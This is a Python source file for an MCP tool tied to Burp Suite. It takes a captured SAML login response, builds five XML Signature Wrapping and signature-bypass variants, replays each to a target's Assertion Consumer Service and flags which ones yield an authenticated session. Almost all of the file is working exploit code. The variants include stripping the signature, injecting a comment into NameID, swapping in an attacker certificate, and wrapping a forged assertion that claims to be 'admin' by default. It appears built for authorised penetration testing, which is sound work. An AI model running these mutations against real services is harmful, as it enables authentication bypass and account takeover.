"""probe_saml_xsw — SAML XML Signature Wrapping active probe (W29-c).

The saml KB (post-W29-i merge) has 5 XSW contexts but no active tool to
build + replay the mutations. Operator captures a real SAMLResponse via
Burp; this tool builds 5 XSW variants and replays each through the ACS
endpoint, comparing for auth-bypass markers (Set-Cookie / 302 redirect to
authenticated path / admin marker in response body).

Variants:
  1. **xsw1_wrap_assertion** — clone the signed Assertion, place malicious
     copy outside the signed scope but in document order BEFORE the original.
  2. **xsw2_sibling_wrap** — same as xsw1 but malicious copy as sibling.
  3. **comment_injection** — inject `<!---->` into NameID to split the
     parser's canonicalisation result from what app code reads.
  4. **signature_exclusion** — strip ds:Signature entirely.
  5. **keyinfo_swap** — replace KeyInfo with attacker cert (operator-provided).

The XML mutations are deterministic string transforms over the captured
SAMLResponse — no xmlsec dep, no protocol library. Operator-built keyinfo
cert is optional (variants 1-4 work on the captured response as-is).

VerdictResult:
  - CONFIRMED — any variant lands on an authenticated state (302 → /home
    or similar, Set-Cookie session token, admin-marker in body)
  - SUSPECTED — server returns 200/302 with same status as baseline (could
    be auth-OK or just a redirect-to-login replay)
  - FAILED — all variants rejected with 400/401/403 + signature-error marker
"""

from __future__ import annotations

import base64
import re
from typing import Any
from urllib.parse import urlparse

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import error_verdict, make_verdict


# Markers that indicate authentication SUCCEEDED post-replay
_AUTH_OK_MARKERS = (
    "set-cookie:",     # any new session cookie
    "location: /home",
    "location: /dashboard",
    "location: /admin",
    "location: /profile",
    "location: /account",
    "welcome",
    "logged in",
    '"authenticated":true',
)

# Markers that indicate the IdP REJECTED the signature
_SIG_REJECT_MARKERS = (
    "signature mismatch",
    "signature invalid",
    "signature verification",
    "invalid signature",
    "not signed",
    "missing signature",
    "samlerror",
    "saml_error",
    "auth failed",
    "authentication failed",
)


# Strip ds:Signature element using a tolerant regex (handles
# default-namespaced and prefixed signatures).
_SIG_RE = re.compile(
    rb"<((?:ds:)?Signature)\b[^>]*>.*?</\1>",
    re.DOTALL | re.IGNORECASE,
)

# Extract the original Assertion element for wrapping
_ASSERTION_RE = re.compile(
    rb"<((?:saml:|saml2:)?Assertion)\b[^>]*>.*?</\1>",
    re.DOTALL | re.IGNORECASE,
)

# Locate NameID for comment-injection
_NAMEID_RE = re.compile(
    rb"<((?:saml:|saml2:)?NameID)\b[^>]*>([^<]+)</\1>",
    re.IGNORECASE,
)


def _xsw_signature_exclusion(saml_xml: bytes) -> bytes:
    """Strip the entire ds:Signature element from the assertion."""
    return _SIG_RE.sub(b"", saml_xml)


def _xsw_wrap_assertion(saml_xml: bytes, attacker_nameid: str) -> bytes | None:
    """XSW1 — clone Assertion, place malicious copy BEFORE original.

    Tampered copy has attacker_nameid as Subject NameID. Original (with
    valid signature) is kept after — vulnerable parsers may validate the
    original signature but read the attacker's first-found Assertion.
    """
    m = _ASSERTION_RE.search(saml_xml)
    if not m:
        return None
    original = m.group(0)
    # Build malicious clone — replace NameID, drop Signature so parsers
    # don't double-verify it.
    clone = _NAMEID_RE.sub(
        b"<\\1>" + attacker_nameid.encode("ascii") + b"</\\1>",
        original,
    )
    clone = _SIG_RE.sub(b"", clone)
    # Insert clone BEFORE original
    return saml_xml[: m.start()] + clone + saml_xml[m.start():]


def _xsw_sibling_wrap(saml_xml: bytes, attacker_nameid: str) -> bytes | None:
    """XSW2 — malicious assertion as sibling AFTER signed one."""
    m = _ASSERTION_RE.search(saml_xml)
    if not m:
        return None
    original = m.group(0)
    clone = _NAMEID_RE.sub(
        b"<\\1>" + attacker_nameid.encode("ascii") + b"</\\1>",
        original,
    )
    clone = _SIG_RE.sub(b"", clone)
    return saml_xml[: m.end()] + clone + saml_xml[m.end():]


def _xsw_comment_injection(saml_xml: bytes, victim_local: str,
                           attacker_domain: str) -> bytes | None:
    """Inject HTML comment in NameID — parser strips comment but app reads full.

    Result: `victim<!---->@attacker.tld` validates as `victim@attacker.tld`
    in canonicalised form, but downstream lookups may use the literal.
    """
    payload = f"{victim_local}<!---->@{attacker_domain}".encode("ascii")
    out = _NAMEID_RE.sub(b"<\\1>" + payload + b"</\\1>", saml_xml, count=1)
    return out if out != saml_xml else None


def _xsw_keyinfo_swap(saml_xml: bytes, attacker_cert_pem: str) -> bytes | None:
    """Replace KeyInfo X509Certificate with attacker cert.

    Vulnerable verifier trusts embedded KeyInfo rather than out-of-band IdP
    cert — re-validates signature against attacker cert. Operator must
    provide a real cert; without it we return None (variant skipped).
    """
    if not attacker_cert_pem.strip():
        return None
    cert_body = attacker_cert_pem
    # Strip PEM headers if present
    cert_body = re.sub(r"-----BEGIN [^-]+-----", "", cert_body)
    cert_body = re.sub(r"-----END [^-]+-----", "", cert_body)
    cert_body = "".join(cert_body.split())  # drop whitespace
    x509_re = re.compile(
        rb"<((?:ds:)?X509Certificate)\b[^>]*>[^<]*</\1>",
        re.IGNORECASE,
    )
    out = x509_re.sub(
        b"<\\1>" + cert_body.encode("ascii") + b"</\\1>",
        saml_xml,
        count=1,
    )
    return out if out != saml_xml else None


def _classify_replay(resp: dict, baseline_status: int) -> tuple[str, str]:
    """Return (auth_state, evidence)."""
    body = resp.get("response_body") or ""
    headers_blob = " ".join(
        f"{k}: {v}" for k, v in (resp.get("response_headers") or {}).items()
    )
    haystack = (body[:8000] + " " + headers_blob).lower()

    for marker in _AUTH_OK_MARKERS:
        if marker in haystack:
            return "auth_ok", marker
    for marker in _SIG_REJECT_MARKERS:
        if marker in haystack:
            return "sig_rejected", marker
    status = resp.get("status_code", 0)
    if status in (200, 302) and status == baseline_status:
        return "ambiguous", f"status {status} matches baseline"
    if status in (400, 401, 403):
        return "rejected", f"status {status}"
    return "unknown", f"status {status}"


async def _send_acs(acs_url: str, saml_xml: bytes, relay_state: str,
                    method: str = "POST", timeout: int = 30) -> dict:
    """POST SAMLResponse (base64-encoded XML) to the ACS endpoint."""
    b64 = base64.b64encode(saml_xml).decode("ascii")
    form_body = f"SAMLResponse={b64}"
    if relay_state:
        form_body += f"&RelayState={relay_state}"
    payload = {
        "method": method,
        "url": acs_url,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "body": form_body,
        "follow_redirects": False,
        "timeout": timeout,
    }
    return await client.post("/api/http/curl", json=payload)


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_saml_xsw(  # cost: low-med (5-6 requests)
        acs_url: str,
        saml_response_b64: str,
        relay_state: str = "",
        attacker_nameid: str = "admin",
        attacker_cert_pem: str = "",
        run_keyinfo_swap: bool = False,
        timeout: int = 30,
    ) -> dict:
        """Probe SAML XSW + signature-exclusion + comment-injection.

        Operator captures a real SAMLResponse from a successful login via
        Burp, then provides:
          - acs_url — the SP's Assertion Consumer Service endpoint
          - saml_response_b64 — the captured SAMLResponse (still base64)
          - relay_state — corresponding RelayState (often empty)
          - attacker_nameid — the NameID to swap into the wrapped assertion
            (e.g. 'admin', 'admin@target.tld', or a known victim username)
          - attacker_cert_pem — optional, for keyinfo_swap variant

        VerdictResult:
          - CONFIRMED — ≥1 variant lands on auth-OK markers
          - SUSPECTED — ≥1 variant returns 200/302 with no clear reject marker
          - FAILED — all variants rejected with signature-error markers

        Args:
            acs_url: SP Assertion Consumer Service URL
            saml_response_b64: captured SAMLResponse (base64)
            relay_state: captured RelayState (often "")
            attacker_nameid: NameID to inject in wrapped assertion
            attacker_cert_pem: optional PEM for keyinfo_swap variant
            run_keyinfo_swap: enable variant 5 (default off — requires cert)
            timeout: per-request timeout (s)
        """
        scope = await client.check_scope(acs_url)
        if not scope.get("in_scope"):
            return error_verdict("saml_xsw", "out_of_scope",
                                 f"{acs_url} not in scope")

        try:
            saml_xml = base64.b64decode(saml_response_b64)
        except Exception as e:
            return error_verdict("saml_xsw", "bad_payload",
                                 f"saml_response_b64 not valid b64: {e}")

        if b"<" not in saml_xml or b"Assertion" not in saml_xml:
            return error_verdict("saml_xsw", "bad_payload",
                                 "decoded payload does not look like SAML XML")

        # First, replay the original to establish baseline
        baseline_resp = await _send_acs(acs_url, saml_xml, relay_state, timeout=timeout)
        if baseline_resp.get("error"):
            return error_verdict("saml_xsw", "baseline_failed",
                                 baseline_resp.get("error", ""))
        baseline_status = baseline_resp.get("status_code", 0)
        logger_indices = []
        if "logger_index" in baseline_resp:
            logger_indices.append(baseline_resp["logger_index"])

        variants: list[tuple[str, bytes | None]] = [
            ("xsw1_wrap_before", _xsw_wrap_assertion(saml_xml, attacker_nameid)),
            ("xsw2_sibling_after", _xsw_sibling_wrap(saml_xml, attacker_nameid)),
            ("comment_injection", _xsw_comment_injection(
                saml_xml, "victim", "attacker.tld")),
            ("signature_exclusion", _xsw_signature_exclusion(saml_xml)),
        ]
        if run_keyinfo_swap:
            variants.append(("keyinfo_swap",
                             _xsw_keyinfo_swap(saml_xml, attacker_cert_pem)))

        variant_results = []
        confirmed_variants = []
        suspected_variants = []

        for name, mutated in variants:
            if mutated is None:
                variant_results.append({
                    "variant": name, "skipped": True,
                    "reason": "no match for mutation source",
                })
                continue
            resp = await _send_acs(acs_url, mutated, relay_state, timeout=timeout)
            if resp.get("error"):
                variant_results.append({
                    "variant": name, "error": resp.get("error", ""),
                })
                continue
            if "logger_index" in resp:
                logger_indices.append(resp["logger_index"])
            state, evidence = _classify_replay(resp, baseline_status)
            variant_results.append({
                "variant": name,
                "status": resp.get("status_code", 0),
                "auth_state": state,
                "evidence": evidence,
            })
            if state == "auth_ok":
                confirmed_variants.append(name)
            elif state == "ambiguous":
                suspected_variants.append(name)

        if confirmed_variants:
            return make_verdict(
                vuln_type="saml_xsw",
                verdict="CONFIRMED",
                confidence=0.9,
                evidence_summary=f"{len(confirmed_variants)} XSW variant(s) reached authenticated state: {', '.join(confirmed_variants)}",
                logger_indices=logger_indices,
                details={
                    "acs_url": acs_url,
                    "confirmed_variants": confirmed_variants,
                    "all_variants": variant_results,
                    "baseline_status": baseline_status,
                },
                human_summary=f"SAML XSW: bypassed via {confirmed_variants[0]}",
            )
        if suspected_variants:
            return make_verdict(
                vuln_type="saml_xsw",
                verdict="SUSPECTED",
                confidence=0.55,
                evidence_summary=f"{len(suspected_variants)} variant(s) match baseline status without rejection",
                logger_indices=logger_indices,
                details={
                    "suspected_variants": suspected_variants,
                    "all_variants": variant_results,
                    "baseline_status": baseline_status,
                },
                human_summary=f"SAML XSW SUSPECTED — {suspected_variants[0]} returned baseline status",
            )
        return make_verdict(
            vuln_type="saml_xsw",
            verdict="FAILED",
            confidence=0.85,
            evidence_summary="All XSW variants rejected with signature-error markers",
            logger_indices=logger_indices,
            details={"all_variants": variant_results,
                     "baseline_status": baseline_status},
            human_summary="SAML correctly enforces signature coverage",
        )
